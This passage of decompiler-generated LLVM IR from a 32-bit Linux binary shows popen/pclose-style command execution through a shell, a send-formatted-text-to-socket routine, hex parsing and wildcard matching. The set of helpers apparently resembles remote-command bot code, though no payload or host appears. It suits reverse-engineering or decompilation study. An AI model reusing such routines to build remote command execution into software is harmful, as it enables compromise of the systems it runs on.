  uselistorder label %dec_label_pc_804890f, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804873c, { 1, 0 }
  uselistorder label %dec_label_pc_804870d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048703, { 1, 0 }
  uselistorder label %dec_label_pc_80486c3, { 1, 0 }
  uselistorder label %dec_label_pc_8048673, { 1, 0 }
}

define i32 @function_8048933(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8048933:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048933 = load i32, i32* @ebp, align 4
  store i32 %v0_8048933, i32* %stack_var_-4, align 4
  %v4_8048933 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048933, i32* @ebp, align 4
  %v4_804893c = ptrtoint i32* %stack_var_8 to i32
  %v4_8048954 = call i32 @function_8048661(i32* null, i32 %arg1, i32 %v4_804893c)
  %v2_8048959 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048959, i32* @ebp, align 4
  ret i32 %v4_8048954

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @function_804895b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804895b:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804895b = load i32, i32* @ebp, align 4
  store i32 %v0_804895b, i32* %stack_var_-4, align 4
  %v4_804895b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804895b, i32* @ebp, align 4
  %v4_8048964 = ptrtoint i32* %stack_var_12 to i32
  %v4_804897b = call i32 @function_8048661(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048964)
  ret i32 %v4_804897b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048982(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048982:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v1_8048990 = call i32 @function_804fd76(i32 2048)
  store i32 %v1_8048990, i32* %stack_var_-20, align 4
  %v3_80489b1 = inttoptr i32 %v1_8048990 to i8*
  %v4_80489b1 = call i32 @function_804f698(i8* %v3_80489b1, i32 0, i32 2048)
  %v4_80489bf = ptrtoint i32* %stack_var_12 to i32
  %v4_80489d6 = call i32 @function_8048661(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_80489bf)
  %v3_80489ec = call i32 @_strlen(i8* %v3_80489b1)
  %v6_80489f3 = add i32 %v1_8048990, %v3_80489ec
  %v1_80489f6 = inttoptr i32 %v6_80489f3 to i8*
  store i8 10, i8* %v1_80489f6, align 1
  store i32 %v1_8048990, i32* @edi, align 4
  %v3_8048a0a = call i32 @_strlen(i8* %v3_80489b1)
  %v4_8048a2a = call i32 @function_804fb14(i32 %arg1, i32 %v1_8048990, i32 %v3_8048a0a, i32 16384)
  %v1_8048a38 = call i32 @function_805074d(i32 %v1_8048990)
  ret i32 %v4_8048a2a

; uselistorder directives
  uselistorder i32 %v1_8048990, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8048a46(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8048a46:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v4_8048a4d = ptrtoint i8* %arg2 to i32
  %v2_8048a50 = load i8, i8* %arg2, align 1
  %v10_8048a53 = icmp eq i8 %v2_8048a50, 114
  br i1 %v10_8048a53, label %dec_label_pc_8048a61, label %dec_label_pc_8048a57

dec_label_pc_8048a57:                             ; preds = %dec_label_pc_8048a46
  %v2_8048a5a = load i8, i8* %arg2, align 1
  %v10_8048a5d = icmp eq i8 %v2_8048a5a, 119
  %v1_8048a5f = icmp eq i1 %v10_8048a5d, false
  br i1 %v1_8048a5f, label %dec_label_pc_8048c23, label %dec_label_pc_8048a61

dec_label_pc_8048a61:                             ; preds = %dec_label_pc_8048a57, %dec_label_pc_8048a46
  %v1_8048a64 = add i32 %v4_8048a4d, 1
  %v1_8048a65 = inttoptr i32 %v1_8048a64 to i8*
  %v2_8048a65 = load i8, i8* %v1_8048a65, align 1
  %v4_8048a68 = icmp eq i8 %v2_8048a65, 0
  br i1 %v4_8048a68, label %dec_label_pc_8048a78, label %dec_label_pc_8048c23

dec_label_pc_8048a78:                             ; preds = %dec_label_pc_8048a61
  %v2_8048a78 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8048a7e = call i32 @function_804e4b4(i32 %v2_8048a78)
  %v2_8048a83 = icmp slt i32 %v2_8048a7e, 0
  %v1_8048a85 = icmp eq i1 %v2_8048a83, false
  br i1 %v1_8048a85, label %dec_label_pc_8048a93, label %dec_label_pc_8048c23

dec_label_pc_8048a93:                             ; preds = %dec_label_pc_8048a78
  %v0_8048a93 = load i8*, i8** @global_var_8059920.17, align 4
  %v2_8048a98 = icmp eq i8* %v0_8048a93, null
  %v1_8048a9a = icmp eq i1 %v2_8048a98, false
  br i1 %v1_8048a9a, label %bb, label %dec_label_pc_8048a9c

dec_label_pc_8048a9c:                             ; preds = %dec_label_pc_8048a93
  %v2_8048a9c = load i32, i32* %stack_var_-24, align 4
  %v3_8048a9c = call i32 @function_804e358(i32 %tmp11, i32 %tmp, i32 %v2_8048a9c)
  %tmp19 = icmp slt i32 %v3_8048a9c, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048ab6, label %dec_label_pc_8048c23

dec_label_pc_8048ab6:                             ; preds = %dec_label_pc_8048a9c
  %v2_8048ab9 = mul i32 %v3_8048a9c, 4
  %v2_8048abf = call i32 @function_804fd76(i32 %v2_8048ab9)
  %v1_8048ac4 = inttoptr i32 %v2_8048abf to i8*
  store i8* %v1_8048ac4, i8** @global_var_8059920.17, align 32
  %v2_8048ace = icmp eq i32 %v2_8048abf, 0
  %v1_8048ad0 = icmp eq i1 %v2_8048ace, false
  br i1 %v1_8048ad0, label %dec_label_pc_8048ade, label %dec_label_pc_8048c23

dec_label_pc_8048ade:                             ; preds = %dec_label_pc_8048ab6
  %v1_8048ae1 = mul i32 %v3_8048a9c, 4
  store i32 %v2_8048abf, i32* @edi, align 4
  %v1_8048af2 = and i32 %v2_8048abf, -256
  %v5_8048af4 = call i8* @_memset(i8* %v1_8048ac4, i32 %v1_8048af2, i32 %v1_8048ae1)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048a93, %dec_label_pc_8048ade
  %v0_8048af6 = call i32 @function_804e1c4()
  %v13_8048b04 = icmp eq i32 %v0_8048af6, -1
  br i1 %v13_8048b04, label %dec_label_pc_8048b15, label %dec_label_pc_8048b0a

dec_label_pc_8048b0a:                             ; preds = %bb
  %v4_8048b0a = icmp eq i32 %v0_8048af6, 0
  %v2_8048b3a = load i8, i8* %arg2, align 1
  %v10_8048b3d = icmp eq i8 %v2_8048b3a, 114
  %v1_8048b3f = icmp eq i1 %v10_8048b3d, false
  br i1 %v4_8048b0a, label %dec_label_pc_8048b37, label %dec_label_pc_8048bdb

dec_label_pc_8048b15:                             ; preds = %bb
  %v3_8048b15 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b1b = call i32 @function_804e2cc(i32 %v3_8048b15)
  %v2_8048b26 = call i32 @function_804e2cc(i32 %tmp7)
  br label %dec_label_pc_8048c23

dec_label_pc_8048b37:                             ; preds = %dec_label_pc_8048b0a
  br i1 %v1_8048b3f, label %dec_label_pc_8048b74, label %dec_label_pc_8048b41

dec_label_pc_8048b41:                             ; preds = %dec_label_pc_8048b37
  %v9_8048b44 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048b44, label %dec_label_pc_8048b67, label %dec_label_pc_8048b49

dec_label_pc_8048b49:                             ; preds = %dec_label_pc_8048b41
  %v4_8048b57 = call i32 @function_804e2fc(i32 %tmp7, i32 1)
  %v2_8048b62 = call i32 @function_804e2cc(i32 %tmp7)
  br label %dec_label_pc_8048b67

dec_label_pc_8048b67:                             ; preds = %dec_label_pc_8048b41, %dec_label_pc_8048b49
  %v3_8048b67 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b6d = call i32 @function_804e2cc(i32 %v3_8048b67)
  br label %dec_label_pc_8048ba4

dec_label_pc_8048b74:                             ; preds = %dec_label_pc_8048b37
  %v3_8048b74 = load i32, i32* %stack_var_-24, align 4
  %v1_8048b77 = icmp eq i32 %v3_8048b74, 0
  br i1 %v1_8048b77, label %dec_label_pc_8048b99, label %dec_label_pc_8048b7b

dec_label_pc_8048b7b:                             ; preds = %dec_label_pc_8048b74
  %v4_8048b89 = call i32 @function_804e2fc(i32 %v3_8048b74, i32 0)
  %v3_8048b8e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b94 = call i32 @function_804e2cc(i32 %v3_8048b8e)
  br label %dec_label_pc_8048b99

dec_label_pc_8048b99:                             ; preds = %dec_label_pc_8048b74, %dec_label_pc_8048b7b
  %v2_8048b9f = call i32 @function_804e2cc(i32 %tmp7)
  br label %dec_label_pc_8048ba4

dec_label_pc_8048ba4:                             ; preds = %dec_label_pc_8048b67, %dec_label_pc_8048b99
  %v8_8048bca = call i32 @function_8050f60(i32 ptrtoint ([8 x i8]* @global_var_8052a2f.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052a2c.19 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052a29.18 to i32), i32 %arg1, i32 0)
  %v2_8048bd6 = call i32 @function_804e274(i32 127)
  unreachable

dec_label_pc_8048bdb:                             ; preds = %dec_label_pc_8048b0a
  br i1 %v1_8048b3f, label %dec_label_pc_8048bf8, label %dec_label_pc_8048be5

dec_label_pc_8048be5:                             ; preds = %dec_label_pc_8048bdb
  %v3_8048be5 = load i32, i32* %stack_var_-24, align 4
  %v2_8048bf1 = call i32 @function_804e2cc(i32 %tmp7)
  br label %dec_label_pc_8048c09

dec_label_pc_8048bf8:                             ; preds = %dec_label_pc_8048bdb
  %v3_8048bfe = load i32, i32* %stack_var_-24, align 4
  %v2_8048c04 = call i32 @function_804e2cc(i32 %v3_8048bfe)
  br label %dec_label_pc_8048c09

dec_label_pc_8048c09:                             ; preds = %dec_label_pc_8048be5, %dec_label_pc_8048bf8
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048bf8 ], [ %v3_8048be5, %dec_label_pc_8048be5 ]
  %v2_8048c0c = mul i32 %stack_var_-28.0, 4
  %v0_8048c11 = load i8*, i8** @global_var_8059920.17, align 4
  %v1_8048c11 = ptrtoint i8* %v0_8048c11 to i32
  %v2_8048c16 = add i32 %v1_8048c11, %v2_8048c0c
  %v2_8048c1b = inttoptr i32 %v2_8048c16 to i32*
  store i32 %v0_8048af6, i32* %v2_8048c1b, align 4
  br label %dec_label_pc_8048c23

dec_label_pc_8048c23:                             ; preds = %dec_label_pc_8048ab6, %dec_label_pc_8048a9c, %dec_label_pc_8048a78, %dec_label_pc_8048a57, %dec_label_pc_8048a61, %dec_label_pc_8048b15, %dec_label_pc_8048c09
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048b15 ], [ %stack_var_-28.0, %dec_label_pc_8048c09 ], [ -1, %dec_label_pc_8048a61 ], [ -1, %dec_label_pc_8048a57 ], [ -1, %dec_label_pc_8048a78 ], [ -1, %dec_label_pc_8048a9c ], [ -1, %dec_label_pc_8048ab6 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048af6, { 1, 2, 0 }
  uselistorder i32 %v3_8048a9c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-24, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i32 (i32, i32)* @function_804e2fc, { 1, 0 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048c23, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048c09, { 1, 0 }
  uselistorder label %dec_label_pc_8048ba4, { 1, 0 }
  uselistorder label %dec_label_pc_8048b99, { 1, 0 }
  uselistorder label %dec_label_pc_8048b67, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_8048c2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048c2c:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %v0_8048c35 = load i8*, i8** @global_var_8059920.17, align 4
  %v2_8048c3a = icmp eq i8* %v0_8048c35, null
  br i1 %v2_8048c3a, label %dec_label_pc_8048d99, label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c2c
  %v1_8048c35 = ptrtoint i8* %v0_8048c35 to i32
  %v2_8048c41 = mul i32 %arg1, 4
  %v2_8048c4b = add i32 %v1_8048c35, %v2_8048c41
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v1_8048c50 = icmp eq i32 %v2_8048c4e, 0
  %v1_8048c52 = icmp eq i1 %v1_8048c50, false
  br i1 %v1_8048c52, label %dec_label_pc_8048c63, label %dec_label_pc_8048d99

dec_label_pc_8048c63:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c69 = call i32 @function_804e2cc(i32 %arg1)
  %v2_8048c6e = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048c77 = call i32 @function_804fc20(i32 %v2_8048c6e)
  %v2_8048c8d = call i32 @function_804fbf4(i32 %v2_8048c6e, i32 2)
  %v2_8048ca3 = call i32 @function_804fbf4(i32 %v2_8048c6e, i32 3)
  %v2_8048cb9 = call i32 @function_804fbf4(i32 %v2_8048c6e, i32 1)
  %v4_8048cc4 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048cd9 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048cd9 = call i32 @function_804e584(i32 0, %_TYPEDEF_sigset_t* %v3_8048cd9, i32 %v4_8048cc4)
  %v2_8048cf8 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %dec_label_pc_8048d19, %dec_label_pc_8048c63
  %v0_8048ce6 = load i8*, i8** @global_var_8059920.17, align 4
  %v1_8048ce6 = ptrtoint i8* %v0_8048ce6 to i32
  %v2_8048ceb = add i32 %v1_8048ce6, %v2_8048c41
  %v1_8048cee = inttoptr i32 %v2_8048ceb to i32*
  %v2_8048cee = load i32, i32* %v1_8048cee, align 4
  %v3_8048d05 = call i32 @function_804e60c(i32 %v2_8048cee, i32 %v2_8048cf8, i32 0)
  %v13_8048d10 = icmp eq i32 %v3_8048d05, -1
  %v1_8048d17 = icmp eq i1 %v13_8048d10, false
  br i1 %v1_8048d17, label %dec_label_pc_8048d25, label %dec_label_pc_8048d19

dec_label_pc_8048d19:                             ; preds = %dec_label_pc_8048cde
  %v1_8048d19 = call i32 @function_804e694(i32 %v3_8048d05)
  %v1_8048d1e = inttoptr i32 %v1_8048d19 to i32*
  %v2_8048d1e = load i32, i32* %v1_8048d1e, align 4
  %v9_8048d20 = icmp eq i32 %v2_8048d1e, 4
  br i1 %v9_8048d20, label %dec_label_pc_8048cde, label %dec_label_pc_8048d25

dec_label_pc_8048d25:                             ; preds = %dec_label_pc_8048d19, %dec_label_pc_8048cde
  %v13_8048d10.lcssa = phi i1 [ true, %dec_label_pc_8048d19 ], [ false, %dec_label_pc_8048cde ]
  %v3_8048d3e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048d3e = call i32 @function_804e584(i32 2, %_TYPEDEF_sigset_t* %v3_8048d3e, i32 0)
  %v2_8048d49 = mul i32 %tmp6, 4
  %v0_8048d4e = load i8*, i8** @global_var_8059920.17, align 4
  %v1_8048d4e = ptrtoint i8* %v0_8048d4e to i32
  %v2_8048d53 = add i32 %v1_8048d4e, %v2_8048d49
  %v1_8048d56 = inttoptr i32 %v2_8048d53 to i32*
  store i32 0, i32* %v1_8048d56, align 4
  br i1 %v13_8048d10.lcssa, label %dec_label_pc_8048d8d, label %dec_label_pc_8048d65

dec_label_pc_8048d65:                             ; preds = %dec_label_pc_8048d25
  %v3_8048d65 = load i32, i32* %stack_var_-268, align 4
  %v1_8048d71 = and i32 %v3_8048d65, 65280
  %v2_8048d781 = udiv i32 %v1_8048d71, 256
  br label %dec_label_pc_8048d8d

dec_label_pc_8048d8d:                             ; preds = %dec_label_pc_8048d25, %dec_label_pc_8048d65
  %storemerge2 = phi i32 [ %v2_8048d781, %dec_label_pc_8048d65 ], [ -1, %dec_label_pc_8048d25 ]
  br label %dec_label_pc_8048d99

dec_label_pc_8048d99:                             ; preds = %dec_label_pc_8048c2c, %dec_label_pc_8048c3e, %dec_label_pc_8048d8d
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048d8d ], [ -1, %dec_label_pc_8048c3e ], [ -1, %dec_label_pc_8048c2c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048d05, { 1, 0 }
  uselistorder i32 %v2_8048c41, { 1, 0 }
  uselistorder i8* %v0_8048c35, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_804fbf4, { 2, 1, 0 }
  uselistorder i8** @global_var_8059920.17, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d99, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048d8d, { 1, 0 }
}

define i32 @function_8048da1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048da1:
  br label %dec_label_pc_8048de0

dec_label_pc_8048db7:                             ; preds = %dec_label_pc_8048de8
  %v3_8048dcf = inttoptr i32 %v5_8048deb to i32*
  %v4_8048dcf = call i32 @function_804e4e4(i32 %arg3, i32* %v3_8048dcf, i32 1)
  %v4_8048dd7 = add nuw i32 %storemerge13, 1
  %v8_8048dda = icmp eq i32 %v4_8048dcf, 0
  %v12_8048dda = icmp eq i32 %v4_8048dcf, 1
  %v1_8048dde = icmp eq i1 %v12_8048dda, false
  br i1 %v1_8048dde, label %dec_label_pc_8048df6, label %dec_label_pc_8048de0

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048da1, %dec_label_pc_8048db7
  %v8_8048dda4 = phi i1 [ false, %dec_label_pc_8048da1 ], [ %v8_8048dda, %dec_label_pc_8048db7 ]
  %storemerge13 = phi i32 [ 0, %dec_label_pc_8048da1 ], [ %v4_8048dd7, %dec_label_pc_8048db7 ]
  %v5_8048de6 = icmp slt i32 %storemerge13, %arg2
  br i1 %v5_8048de6, label %dec_label_pc_8048de8, label %dec_label_pc_8048df6

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048de0
  %v5_8048deb = add i32 %storemerge13, %arg1
  %v1_8048dee = add i32 %v5_8048deb, -1
  %v1_8048def = inttoptr i32 %v1_8048dee to i8*
  %v2_8048def = load i8, i8* %v1_8048def, align 1
  %v10_8048df2 = icmp eq i8 %v2_8048def, 10
  %v1_8048df4 = icmp eq i1 %v10_8048df2, false
  br i1 %v1_8048df4, label %dec_label_pc_8048db7, label %dec_label_pc_8048df6

dec_label_pc_8048df6:                             ; preds = %dec_label_pc_8048de0, %dec_label_pc_8048de8, %dec_label_pc_8048db7
  %v8_8048dda.lcssa = phi i1 [ %v8_8048dda4, %dec_label_pc_8048de0 ], [ %v8_8048dda4, %dec_label_pc_8048de8 ], [ %v8_8048dda, %dec_label_pc_8048db7 ]
  br i1 %v8_8048dda.lcssa, label %dec_label_pc_8048e0b, label %dec_label_pc_8048dfc

dec_label_pc_8048dfc:                             ; preds = %dec_label_pc_8048df6
  br label %dec_label_pc_8048e0b

dec_label_pc_8048e0b:                             ; preds = %dec_label_pc_8048df6, %dec_label_pc_8048dfc
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048dfc ], [ 0, %dec_label_pc_8048df6 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048deb, { 1, 0 }
  uselistorder i1 %v8_8048dda4, { 1, 0 }
  uselistorder i1 %v8_8048dda, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e0b, { 1, 0 }
  uselistorder label %dec_label_pc_8048df6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048de0, { 1, 0 }
}

define i32 @function_8048e10(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048e10:
  %v4_8048e3f1 = ptrtoint i8* %arg1 to i32
  %v2_8048e422 = load i8, i8* %arg1, align 1
  %v4_8048e454 = icmp eq i8 %v2_8048e422, 0
  br i1 %v4_8048e454, label %dec_label_pc_8048e4f, label %dec_label_pc_8048e49

dec_label_pc_8048e1f:                             ; preds = %dec_label_pc_8048e49
  %v2_8048e24 = mul i32 %stack_var_-8.06, 16
  %v2_8048e2a = load i8, i8* %stack_var_4.07, align 1
  %v3_8048e2a = zext i8 %v2_8048e2a to i32
  %v1_8048e30 = mul nuw nsw i32 %v3_8048e2a, 4
  %v2_8048e30 = add i32 %v1_8048e30, ptrtoint (i32* @global_var_8052a40.21 to i32)
  %v3_8048e30 = inttoptr i32 %v2_8048e30 to i32*
  %v4_8048e30 = load i32, i32* %v3_8048e30, align 4
  %v2_8048e37 = or i32 %v4_8048e30, %v2_8048e24
  %v5_8048e3c = add i32 %v4_8048e3f8, 1
  %v22_8048e3c = inttoptr i32 %v5_8048e3c to i8*
  %v2_8048e42 = load i8, i8* %v22_8048e3c, align 1
  %v4_8048e45 = icmp eq i8 %v2_8048e42, 0
  br i1 %v4_8048e45, label %dec_label_pc_8048e4f, label %dec_label_pc_8048e49

dec_label_pc_8048e49:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048e1f
  %v4_8048e3f8 = phi i32 [ %v5_8048e3c, %dec_label_pc_8048e1f ], [ %v4_8048e3f1, %dec_label_pc_8048e10 ]
  %stack_var_4.07 = phi i8* [ %v22_8048e3c, %dec_label_pc_8048e1f ], [ %arg1, %dec_label_pc_8048e10 ]
  %stack_var_-8.06 = phi i32 [ %v2_8048e37, %dec_label_pc_8048e1f ], [ 0, %dec_label_pc_8048e10 ]
  %v5_8048e49 = icmp slt i32 %stack_var_-8.06, 0
  %v1_8048e4d = icmp eq i1 %v5_8048e49, false
  br i1 %v1_8048e4d, label %dec_label_pc_8048e1f, label %dec_label_pc_8048e4f

dec_label_pc_8048e4f:                             ; preds = %dec_label_pc_8048e1f, %dec_label_pc_8048e49, %dec_label_pc_8048e10
  %stack_var_-8.0.lcssa = phi i32 [ 0, %dec_label_pc_8048e10 ], [ %v2_8048e37, %dec_label_pc_8048e1f ], [ %stack_var_-8.06, %dec_label_pc_8048e49 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048e4f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048e49, { 1, 0 }
}

define i32 @function_8048e54(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048e54:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048e57 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e57, i32* %stack_var_-8, align 4
  %v4_8048e5b = ptrtoint i8* %arg1 to i32
  %v2_8048e5e = load i8, i8* %arg1, align 1
  %v12_8048e67 = icmp eq i8 %v2_8048e5e, 42
  br i1 %v12_8048e67, label %dec_label_pc_8048e8f, label %dec_label_pc_8048e6d

dec_label_pc_8048e6d:                             ; preds = %dec_label_pc_8048e54
  %v12_8048e6d = icmp eq i8 %v2_8048e5e, 63
  br i1 %v12_8048e6d, label %dec_label_pc_8048ee2, label %dec_label_pc_8048e73

dec_label_pc_8048e73:                             ; preds = %dec_label_pc_8048e6d
  %v4_8048e73 = icmp eq i8 %v2_8048e5e, 0
  br i1 %v4_8048e73, label %dec_label_pc_8048e7e, label %dec_label_pc_8048f1c

dec_label_pc_8048e7e:                             ; preds = %dec_label_pc_8048e73
  %v2_8048e81 = load i8, i8* %tmp12, align 1
  %v3_8048e81 = zext i8 %v2_8048e81 to i32
  br label %dec_label_pc_8048f72

dec_label_pc_8048e8f:                             ; preds = %dec_label_pc_8048e54
  %v1_8048e92 = add i32 %v4_8048e5b, 1
  %v4_8048e9a = inttoptr i32 %v1_8048e92 to i8*
  %v5_8048e9d = call i32 @function_8048e54(i8* %v4_8048e9a, i32 %arg2)
  %v1_8048ea2 = icmp eq i32 %v5_8048e9d, 0
  br i1 %v1_8048ea2, label %dec_label_pc_8048ed0, label %dec_label_pc_8048ea6

dec_label_pc_8048ea6:                             ; preds = %dec_label_pc_8048e8f
  %v2_8048ea9 = load i8, i8* %tmp12, align 1
  %v4_8048eac = icmp eq i8 %v2_8048ea9, 0
  br i1 %v4_8048eac, label %dec_label_pc_8048ed7, label %dec_label_pc_8048eb0

dec_label_pc_8048eb0:                             ; preds = %dec_label_pc_8048ea6
  %v1_8048eb3 = add i32 %arg2, 1
  %v5_8048ebe = call i32 @function_8048e54(i8* nonnull %arg1, i32 %v1_8048eb3)
  %v1_8048ec3 = icmp eq i32 %v5_8048ebe, 0
  br i1 %v1_8048ec3, label %dec_label_pc_8048ed0, label %dec_label_pc_8048ed7

dec_label_pc_8048ed0:                             ; preds = %dec_label_pc_8048eb0, %dec_label_pc_8048e8f
  br label %dec_label_pc_8048ed7

dec_label_pc_8048ed7:                             ; preds = %dec_label_pc_8048ea6, %dec_label_pc_8048eb0, %dec_label_pc_8048ed0
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8048ed0 ], [ 1, %dec_label_pc_8048eb0 ], [ 1, %dec_label_pc_8048ea6 ]
  br label %dec_label_pc_8048f72

dec_label_pc_8048ee2:                             ; preds = %dec_label_pc_8048e6d
  %v2_8048ee5 = load i8, i8* %tmp12, align 1
  %v4_8048ee8 = icmp eq i8 %v2_8048ee5, 0
  br i1 %v4_8048ee8, label %dec_label_pc_8048f14, label %dec_label_pc_8048eec

dec_label_pc_8048eec:                             ; preds = %dec_label_pc_8048ee2
  %v1_8048eef = add i32 %arg2, 1
  %v1_8048ef3 = add i32 %v4_8048e5b, 1
  %v4_8048ef8 = inttoptr i32 %v1_8048ef3 to i8*
  %v5_8048efb = call i32 @function_8048e54(i8* %v4_8048ef8, i32 %v1_8048eef)
  %v1_8048f00 = icmp ne i32 %v5_8048efb, 0
  %. = zext i1 %v1_8048f00 to i32
  br label %dec_label_pc_8048f14

dec_label_pc_8048f14:                             ; preds = %dec_label_pc_8048eec, %dec_label_pc_8048ee2
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048ee2 ], [ %., %dec_label_pc_8048eec ]
  br label %dec_label_pc_8048f72

dec_label_pc_8048f1c:                             ; preds = %dec_label_pc_8048e73
  %v2_8048f1f = load i8, i8* %arg1, align 1
  %v3_8048f1f = zext i8 %v2_8048f1f to i32
  %v2_8048f28 = call i32 @function_804e674(i32 %v3_8048f1f)
  store i32 %v2_8048f28, i32* @ebx, align 4
  %v2_8048f32 = load i8, i8* %tmp12, align 1
  %v3_8048f32 = zext i8 %v2_8048f32 to i32
  %v2_8048f3b = call i32 @function_804e674(i32 %v3_8048f32)
  %v0_8048f40 = load i32, i32* @ebx, align 4
  %v12_8048f40 = icmp eq i32 %v0_8048f40, %v2_8048f3b
  %v1_8048f42 = icmp eq i1 %v12_8048f40, false
  br i1 %v1_8048f42, label %dec_label_pc_8048f6c, label %dec_label_pc_8048f44

dec_label_pc_8048f44:                             ; preds = %dec_label_pc_8048f1c
  %v1_8048f47 = add i32 %arg2, 1
  %v1_8048f4b = add i32 %v4_8048e5b, 1
  %v4_8048f50 = inttoptr i32 %v1_8048f4b to i8*
  %v5_8048f53 = call i32 @function_8048e54(i8* %v4_8048f50, i32 %v1_8048f47)
  %v1_8048f58 = icmp ne i32 %v5_8048f53, 0
  %.6 = zext i1 %v1_8048f58 to i32
  br label %dec_label_pc_8048f6c

dec_label_pc_8048f6c:                             ; preds = %dec_label_pc_8048f44, %dec_label_pc_8048f1c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048f1c ], [ %.6, %dec_label_pc_8048f44 ]
  br label %dec_label_pc_8048f72

dec_label_pc_8048f72:                             ; preds = %dec_label_pc_8048f14, %dec_label_pc_8048ed7, %dec_label_pc_8048e7e, %dec_label_pc_8048f6c
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_8048ed7 ], [ %storemerge4, %dec_label_pc_8048f14 ], [ %v3_8048e81, %dec_label_pc_8048e7e ], [ %storemerge, %dec_label_pc_8048f6c ]
  %v2_8048f78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048f78, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048e5e, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048f72, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048ed7, { 2, 1, 0 }
}

define i32 @function_8048f7b(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8048f7b:
